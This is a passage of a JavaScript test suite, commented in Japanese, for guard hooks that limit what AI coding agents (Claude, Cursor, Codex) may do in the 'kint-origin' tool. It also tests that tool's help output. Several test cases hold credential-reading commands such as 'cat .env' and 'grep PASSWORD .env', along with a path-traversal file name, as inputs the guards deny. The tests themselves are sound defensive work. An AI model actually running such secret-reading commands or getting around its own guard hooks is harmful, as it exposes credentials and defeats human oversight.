    expect("guard: data/cybozu-common/ も deny", write("/x/data/cybozu-common/users/users.json").decision === "deny", write("/x/data/cybozu-common/users/users.json").raw);

    // AI が自分の保護を外せない: hook・権限設定・AI ツールの設定の編集は ask。
    for (const rel of [".agents/hooks/kint-origin-guard-core.mjs", ".claude/hooks/kint-origin-guard.mjs", ".claude/settings.json", ".claude/settings.local.json", ".cursor/hooks.json", ".cursor/hooks/kint-origin-guard.mjs", ".codex/rules/kint-origin.rules", ".codex/hooks.json", ".codex/hooks/kint-origin-guard.mjs", ".mcp.json"]) {
      expect(`guard: 保護に関わるファイル（${rel}）の編集は ask`, write(rel).decision === "ask", write(rel).raw);
    }
    expect("guard: ローカルスキル（.claude/skills/kint-origin-local-*/SKILL.md）の編集は素通り（独自のスキルを足せる）", write(".claude/skills/kint-origin-local-new/SKILL.md").decision === "", write(".claude/skills/kint-origin-local-new/SKILL.md").raw);

    // .env の読み取り: Read ツールとシェルでの読み取りは deny。.env.example は読める。
    for (const command of ["cat .env", "type .env", "Get-Content .env", "grep PASSWORD .env", "head -n 3 .env", "Select-String CYBOZU .env"]) {
      expect(`guard: .env の読み取りコマンド（${command}）は deny`, ["Bash", "PowerShell"].every((tool) => runClaude({ tool_name: tool, tool_input: { command }, cwd }).decision === "deny"), command);
    }
    expect("guard: .env.example を読むコマンドは素通り", runClaude({ tool_name: "Bash", tool_input: { command: "cat .env.example" }, cwd }).decision === "", "cat .env.example denied");
    expect("guard: kint-origin policy（認証値を出さない確認手段）は素通り", runClaude({ tool_name: "Bash", tool_input: { command: "kint-origin policy" }, cwd }).decision === "", "policy denied");

    // push の検出: kint-origin を経由しない呼び出しも拾う。
    for (const command of ["node dist/cli.js push app --id 3 -y", 'node "C:\\tools\\kint-origin-tools\\dist\\cli.js" push records --name x', "kint-origin.exe push app --id 3"]) {
      expect(`guard(Claude): ${command} は push として ask`, runClaude({ tool_name: "Bash", tool_input: { command }, cwd }).decision === "ask", command);
      expect(`guard(Cursor): ${command} は push として deny`, runCursor(command).permission === "deny", command);
    }
    expect("guard: cli.js を含むが push ではないコマンドは素通り（node scripts/cli.js pull は対象外）", runClaude({ tool_name: "Bash", tool_input: { command: "node dist/cli.js pull app --id 3" }, cwd }).decision === "", "pull denied");

    // update -y: 確認なしで保護設定を含む配布ファイルを上書きする。Claude は ask、Cursor は deny。-y なしの update は素通り。
    for (const command of ["kint-origin update -y", "kint-origin update --yes", "node dist/cli.js update -y", "kint-origin.cmd update -y"]) {
      expect(`guard(Claude): ${command} は ask`, runClaude({ tool_name: "Bash", tool_input: { command }, cwd }).decision === "ask", command);
      expect(`guard(Cursor): ${command} は deny`, runCursor(command).permission === "deny", command);
    }
    expect("guard: update（-y なし）は素通り（CLI が上書きの一覧を示して y/N で確認する）", runClaude({ tool_name: "Bash", tool_input: { command: "kint-origin update" }, cwd }).decision === "" && runCursor("kint-origin update").permission === "allow", "update without -y not passed");

    // fail-closed: 壊れた入力は素通りさせず ask（Claude）/ deny（Cursor）。
    expect("guard(Claude): 壊れた入力は素通りさせず ask", runClaude(null, "not json").decision === "ask", runClaude(null, "not json").raw);
    expect("guard(Claude): 空の入力も ask", runClaude(null, "").decision === "ask", "empty input passed through");

    // 配布する settings.json: ガードの起動は $CLAUDE_PROJECT_DIR 経由、.env の読み取りを deny、allow は書き込める・削除できるコマンドを含まない。
    const settings = JSON.parse(fs.readFileSync(path.join(ROOT, "template", "agents", "claude", ".claude", "settings.json"), "utf8"));
    expect("settings: ガードの起動は $CLAUDE_PROJECT_DIR 経由（cwd が違っても動き、素通りにならない）", settings.hooks.PreToolUse[0].hooks[0].command.includes("$CLAUDE_PROJECT_DIR"), settings.hooks.PreToolUse[0].hooks[0].command);
    expect("settings: permissions.deny に .env の読み取りがある（.env.example は含まない）", settings.permissions.deny.includes("Read(./.env)") && !settings.permissions.deny.some((entry) => entry.includes(".env.example")), JSON.stringify(settings.permissions.deny));
    const dangerous = ["Bash(find:*)", "Bash(sort:*)", "Bash(echo:*)", "Bash(git branch:*)", "Bash(git remote:*)"];
    expect("settings: allow に、書き込み・削除・設定変更ができるコマンド（find / sort / echo / git branch / git remote）を含まない", dangerous.every((entry) => !settings.permissions.allow.includes(entry)), settings.permissions.allow.filter((e) => dangerous.includes(e)).join(","));
    expect("settings: 読み取り専用のコマンド（ls / cat / grep / git status / git log / git diff）は allow に残る", ["Bash(ls:*)", "Bash(cat:*)", "Bash(grep:*)", "Bash(git status:*)", "Bash(git log:*)", "Bash(git diff:*)"].every((entry) => settings.permissions.allow.includes(entry)), "read-only allow missing");
    expect("settings: kint-origin は ask のまま", settings.permissions.ask.includes("Bash(kint-origin:*)"), "kint-origin not in ask");

    // Codex のルール: update 全体（-y・--yes・フラグの位置を問わない）を prompt にする。
    const rules = fs.readFileSync(path.join(ROOT, "template", "agents", "codex", ".codex", "rules", "kint-origin.rules"), "utf8");
    expect("codex: update 全体を prompt にするルールがある（-y・--yes・フラグの位置を問わない）", rules.includes('"update"],') && rules.includes('"kint-origin update --yes"') && !rules.includes('"update", "-y"'), "codex update rule missing");

    // 独自スキル・ルールの名前（kint-origin-local-）: 新規作成だけ拒否し、既存の編集は通す。同じ表を Claude・Cursor・Codex の 3 つの hook に流し、判定が一致すること。
    const codexGuard = path.join(guardRoot, ".codex", "hooks", "kint-origin-guard.mjs");
    const namingRoot = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-naming-"));
    try {
      for (const dir of [".claude/skills/kint-origin-commands", ".claude/skills/existing-skill", ".agents/rules"]) fs.mkdirSync(path.join(namingRoot, dir), { recursive: true });
      fs.writeFileSync(path.join(namingRoot, ".agents", "rules", "kint-origin.md"), "rule\n", "utf8");
      const runCursorTool = (toolInput) => {
        const r = spawnSync(process.execPath, [cursorGuard], { input: JSON.stringify({ hook_event_name: "preToolUse", tool_name: "Write", tool_input: toolInput, workspace_roots: [namingRoot], cwd: namingRoot }), encoding: "utf8" });
        return { status: r.status, ...JSON.parse((r.stdout || "{}").trim()) };
      };
      const runCodex = (command, raw) => {
        const r = spawnSync(process.execPath, [codexGuard], { input: raw ?? JSON.stringify({ cwd: namingRoot, tool_name: "apply_patch", tool_input: { command } }), encoding: "utf8" });
        const out = (r.stdout || "").trim();
        return { status: r.status, out, decision: out ? JSON.parse(out).hookSpecificOutput?.permissionDecision : "" };
      };
      const addPatch = (rel) => `*** Begin Patch\n*** Add File: ${rel}\n+hello\n*** End Patch\n`;
      const namingCases = [
        [".claude/skills/new-skill/SKILL.md", true],
        [".agents/skills/new-skill/SKILL.md", true],
        [".cursor/skills/new-skill/SKILL.md", true],
        [".claude/skills/kint-origin-local-new/SKILL.md", false],
        [".claude/skills/kint-origin-local-new/references/a.md", false],
        [".claude/skills/existing-skill/SKILL.md", false],
        [".claude/skills/kint-origin-commands/SKILL.md", false],
        [".claude/skills/kint-origin-addon-x/SKILL.md", true],
        [".claude/skills/kint-origin-new/SKILL.md", true],
        [".claude/rules/my-rule.md", true],
        [".claude/rules/kint-origin-local-my-rule.md", false],
        [".agents/rules/kint-origin.md", false],
        [".cursor/rules/x.mdc", true],
        [".claude/skills/kint-origin-local-x/../evil/SKILL.md", true],
        ["doc/skills/foo.md", false]
      ];
      for (const [rel, denied] of namingCases) {
        const abs = path.join(namingRoot, ...rel.split("/"));
        const claudeRel = runClaude({ tool_name: "Write", tool_input: { file_path: rel }, cwd: namingRoot });
        const claudeAbs = runClaude({ tool_name: "Write", tool_input: { file_path: abs }, cwd: namingRoot });
        const cursor = runCursorTool({ file_path: abs });
        const codex = runCodex(addPatch(rel));
        expect(`naming guard(Claude): ${rel} は ${denied ? "deny" : "素通り"}（相対・絶対とも）`, (claudeRel.decision === "deny") === denied && (claudeAbs.decision === "deny") === denied, `${claudeRel.raw} | ${claudeAbs.raw}`);
        expect(`naming guard(Cursor): ${rel} は ${denied ? "deny" : "allow"}`, cursor.status === 0 && cursor.permission === (denied ? "deny" : "allow"), JSON.stringify(cursor));
        expect(`naming guard(Codex): ${rel} は ${denied ? "deny" : "素通り（出力なし）"}`, codex.status === 0 && (denied ? codex.decision === "deny" : codex.out === ""), JSON.stringify(codex));
        if (denied) {
          expect(
            `naming guard: ${rel} の拒否は kint-origin-local-<名前> と kint-origin-extend を案内する（3 つの hook とも）`,
            [claudeRel.raw, JSON.stringify(cursor), codex.out].every((text) => text.includes("kint-origin-local-") && text.includes("kint-origin-extend")),
            `${claudeRel.raw} | ${JSON.stringify(cursor)} | ${codex.out}`
          );
        }
      }
      // Cursor: パスの項目名が file_path 以外（path）でも判定する。パスが無い入力・シェルの入力は従来どおり allow。
      for (const field of ["path", "target_file", "filePath"]) {
        expect("naming guard(Cursor): tool_input." + field + " でも判定する", runCursorTool({ [field]: path.join(namingRoot, ".claude", "skills", "new-skill", "SKILL.md") }).permission === "deny", field + " field not read");
      }
      expect("naming guard(Cursor): パスが取れない入力は allow（名前の案内であり保護ではない）", runCursorTool({}).permission === "allow", "no path denied");
      expect("naming guard(Cursor): シェルの入力は従来どおり（git status は allow）", runCursor("git status").permission === "allow", "shell input changed");
      // Codex: 既存ファイルの更新だけのパッチは通す。既存フォルダのファイルを接頭辞なしの名前へ移すパッチは deny。壊れた入力は止めない。
      const updatePatch = "*** Begin Patch\n*** Update File: .claude/skills/new-skill/SKILL.md\n@@\n-a\n+b\n*** End Patch\n";
      const movePatch = "*** Begin Patch\n*** Update File: .claude/skills/existing-skill/SKILL.md\n*** Move to: .claude/skills/renamed/SKILL.md\n@@\n-a\n+b\n*** End Patch\n";
      expect("naming guard(Codex): Update File だけのパッチは通す", runCodex(updatePatch).out === "", "update patch denied");
      expect("naming guard(Codex): Move to で接頭辞なしの名前へ移すパッチは deny", runCodex(movePatch).decision === "deny", "move patch passed");
      expect("naming guard(Codex): 壊れた入力は止めない（出力なし・exit 0）", (() => { const r = runCodex("", "not json"); return r.status === 0 && r.out === ""; })(), "broken input blocked");
      // 共通化で Cursor/Codex の保護範囲を拡大しない。
      for (const file of [".env", "data/kintone/apps/app-1/app.json", "push/records/job/runs/result.json"]) {
        expect("guard(Cursor/Codex): " + file + " に命名以外の制限を加えない", runCursorTool({ file_path: file }).permission === "allow" && runCodex(addPatch(file)).out === "", file);
      }
      expect("guard(Cursor): .env の読み取りも今回の保護拡大には含めない", runCursor("cat .env").permission === "allow", "env protection expanded");
      const windowsRel = ".agents\\skills\\new-skill\\SKILL.md";
      expect("naming guard: Windows の区切りでも3入口で拒否する",
        runClaude({ tool_name: "Write", tool_input: { file_path: windowsRel }, cwd: namingRoot }).decision === "deny" &&
        runCursorTool({ file_path: windowsRel }).permission === "deny" && runCodex(addPatch(windowsRel)).decision === "deny", windowsRel);

      // 実行 cwd は配布先の外。相対 import は入口の位置から解決され、node_modules を要しない。
      expect("guard: 配布先に node_modules を持たず3入口を起動できる", !fs.existsSync(path.join(guardRoot, "node_modules")) &&
        runClaude({ tool_name: "Bash", tool_input: { command: "git status" }, cwd: namingRoot }).status === 0 &&
        runCursor("git status").permission === "allow" && runCodex(addPatch(".agents/skills/kint-origin-local-new/SKILL.md")).status === 0, guardRoot);

      // 共有モジュールの欠落・構文エラーでも、各入口のエラー時の方針を維持する。
      const coreFile = path.join(guardRoot, ".agents", "hooks", "kint-origin-guard-core.mjs");
      const coreSource = fs.readFileSync(coreFile, "utf8");
      try {
        for (const [label, broken] of [["欠落", null], ["構文エラー", "export const = ;\n"]]) {
          if (broken === null) fs.unlinkSync(coreFile);
          else fs.writeFileSync(coreFile, broken, "utf8");
          const claude = runClaude({ tool_name: "Bash", tool_input: { command: "git status" }, cwd: namingRoot });
          const cursor = runCursor("git status");
          const codex = runCodex(addPatch(".agents/skills/new-skill/SKILL.md"));
          expect("guard: 共有モジュール" + label + "で Claude は ask JSON・exit 0", claude.status === 0 && claude.decision === "ask", claude.raw);
          expect("guard: 共有モジュール" + label + "で Cursor シェルは理由付き deny JSON", cursor.permission === "deny" && cursor.user_message && cursor.agent_message, JSON.stringify(cursor));
          expect("guard: 共有モジュール" + label + "で Cursor の命名ガードは allow JSON", runCursorTool({ file_path: ".agents/skills/new-skill/SKILL.md" }).permission === "allow", label);
          expect("guard: 共有モジュール" + label + "で Codex は無出力・exit 0", codex.status === 0 && codex.out === "", JSON.stringify(codex));
        }
      } finally {
        fs.writeFileSync(coreFile, coreSource, "utf8");
      }

    } finally {
      fs.rmSync(namingRoot, { recursive: true, force: true });
    }
  } finally {
    fs.rmSync(guardRoot, { recursive: true, force: true });
  }
}

// D-1: サブコマンド別のヘルプ。--help / -h / help <コマンド> は exit 0・stdout で、操作制限・認証値・API に触れない。
async function subcommandHelpTests({ expect, runCli, dist }) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-help-"));
  try {
    // 認証値も .env も無い空のフォルダで動く（API・操作制限に触れない）。
    const ok = (args) => {
      const r = runCli(args, tmp);
      return { ...r, ok: r.status === 0 && r.stdout.startsWith("Usage: kint-origin") };
    };

    const group = ok(["pull", "--help"]);
    expect(
      "help: グループ（pull --help）は全サブコマンドを並べ、詳細の見方を案内する（exit 0・stdout）",
      group.ok && ["pull index", "pull kintone", "pull app", "pull records", "pull favorite", "pull users"].every((key) => group.stdout.includes(key)) && group.stdout.includes("pull <サブコマンド> --help") && !group.stdout.includes("push app"),
      group.stdout + group.stderr
    );

    const app = ok(["pull", "app", "--help"]);
    expect(
      "help: pull app --help は説明・使えるオプション・必要な許可を示す。--a で変わる許可も示す",
      app.ok && app.stdout.includes("--discard-local") && app.stdout.includes("使えるオプション: --id, --guestspace, --plugin, --a, -f/--force, --discard-local") && app.stdout.includes("KINT_ORIGIN_ALLOW_PULL_KINTONE") && app.stdout.includes("--a を付けると") && app.stdout.includes("KINT_ORIGIN_ALLOW_PULL_RECORDS"),
      app.stdout + app.stderr
    );

    const records = ok(["push", "records", "-h"]);
    expect(
      "help: push records -h は通常の実行と --restore の両方の形式と、必要な許可（PULL_RECORDS と PUSH_RECORDS）を示す",
      records.ok && records.stdout.includes("--restore <実行時刻>") && records.stdout.includes("KINT_ORIGIN_ALLOW_PULL_RECORDS と KINT_ORIGIN_ALLOW_PUSH_RECORDS") && records.stdout.includes("使えるオプション: --name, --restore, --overwrite-remote, -y/--yes"),
      records.stdout + records.stderr
    );

    expect("help: help <コマンド> も同じ出力", runCli(["help", "push", "app"], tmp).stdout === runCli(["push", "app", "--help"], tmp).stdout && runCli(["help", "push", "app"], tmp).status === 0, "help form differs");

    const create = ok(["diff", "create", "--help"]);
    expect("help: 許可が不要なコマンド（diff create）は「なし」と示す", create.ok && create.stdout.includes("必要な許可（.env）: なし"), create.stdout);

    for (const command of ["init", "update", "html", "policy", "secret"]) {
      const top = ok([command, "--help"]);
      expect(`help: ${command} --help も動く`, top.ok && top.stdout.includes(command), top.stdout + top.stderr);
    }
    const update = ok(["update", "--help"]);
    expect("help: update --help は上書き前の確認・-y・kint-origin-local-* の扱い・本体フォルダで実行できないことを示す", update.ok && update.stdout.includes("y/N で確認") && update.stdout.includes("-y") && update.stdout.includes("kint-origin-local-*") && update.stdout.includes("ツール本体のフォルダでは実行できない"), update.stdout);

    // 不明なコマンドは、従来どおり exit 1 で、USAGE を案内する。
    const unknown = runCli(["pull", "nope", "--help"], tmp);
    expect("help: 不明なコマンドへの --help は exit 1 で Unknown command と USAGE", unknown.status === 1 && unknown.stderr.includes("Unknown command: pull nope") && unknown.stderr.includes("Usage:"), unknown.stderr);

    // ヘルプは操作制限・認証値・API に触れない（.env が壊れていても、許可が無くても動く）。
    fs.writeFileSync(path.join(tmp, ".env"), "KINT_ORIGIN_ALLOW_PUSH_APP=maybe\n", "utf8");
    const withBadEnv = ok(["push", "app", "--help"]);
    expect("help: .env の操作制限が不正でも、ヘルプは表示できる（操作制限・認証値を読まない）", withBadEnv.ok && !withBadEnv.stderr.includes("操作制限:"), withBadEnv.stdout + withBadEnv.stderr);

    // 全サブコマンドがヘルプを持つ（USAGE にブロックが無いサブコマンドが増えたときの検知）。
    const policy = await import(dist("policy.js"));
    const missing = [];
    for (const [group, table] of [["pull", policy.PULL_REQUIREMENTS], ["push", policy.PUSH_REQUIREMENTS], ["diff", policy.DIFF_REQUIREMENTS], ["show", policy.SHOW_REQUIREMENTS], ["app", policy.APP_REQUIREMENTS]]) {
      for (const sub of Object.keys(table)) {
        const r = runCli([group, sub, "--help"], tmp);
        if (!(r.status === 0 && r.stdout.includes(`${group} ${sub}`) && r.stdout.includes("使えるオプション:"))) missing.push(`${group} ${sub}`);
      }
    }
    expect("help: 登録済みの全サブコマンド（pull / push / diff / show / app）に、使えるオプションつきのヘルプがある", missing.length === 0, missing.join(", "));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}
